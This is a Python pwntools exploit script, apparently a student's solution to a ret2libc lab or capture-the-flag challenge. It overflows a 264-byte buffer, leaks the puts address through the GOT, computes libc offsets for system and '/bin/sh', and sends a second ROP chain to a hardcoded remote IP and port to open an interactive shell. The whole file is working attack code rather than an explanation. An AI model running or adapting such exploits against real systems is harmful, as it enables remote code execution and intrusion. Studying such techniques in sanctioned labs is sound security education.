from pwn import *
import struct
context.log_level = 'DEBUG' 



#puts_addr = 0x7ffff7a62aa0 
#puts_offset = 0x080aa0

#sys_addr = 0x04f550 + puts_addr -puts_offset
#poprdi_addr = 0x215bf + puts_addr - puts_offset
#ret_addr = 0x08aa + puts_addr - puts_offset
#props_addr = 0x1b3e1a + puts_addr - puts_offset

poprdi_addr = 0x0400843
e = ELF('./02_ret2libc64')
puts_addr = e.symbols['puts']
puts_got = e.got['puts']
hear_addr = e.symbols['hear']
print(puts_addr,puts_got,hear_addr)

testkey = b"h"*264 + p64(poprdi_addr)+p64(puts_got)+p64(puts_addr)+p64(hear_addr)


#conn = process("02_ret2libc64")
conn = remote("47.99.80.189", 10012)
conn.recvuntil("ID:\n")
conn.sendline("3180104933")
conn.recvuntil("ID:\n")
conn.sendline("1")
#s = conn.recvline()
#s = str(s,'UTF-8')
#print(s)
#realS = s[-13:]
#print(realS)
#print(str(int(realS,16)-int(hex(280),16)))
#key += p64(int(realS,16)-int(hex(280),16))
conn.recvuntil("me!\n")

conn.sendline(testkey)
puts_addr = u64(conn.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
puts_offset = 0x080aa0
print(hex(puts_addr))

sys_addr = 0x04f550 + puts_addr -puts_offset
poprdi_addr = 0x215bf + puts_addr - puts_offset
ret_addr = 0x08aa + puts_addr - puts_offset
props_addr = 0x1b3e1a + puts_addr - puts_offset

key  =  b"h"*264
key += p64(ret_addr)
key += p64(poprdi_addr)
key += p64(props_addr)
key += p64(sys_addr)

conn.sendline(key)

#print(conn.recv()[0:8])
conn.interactive()   
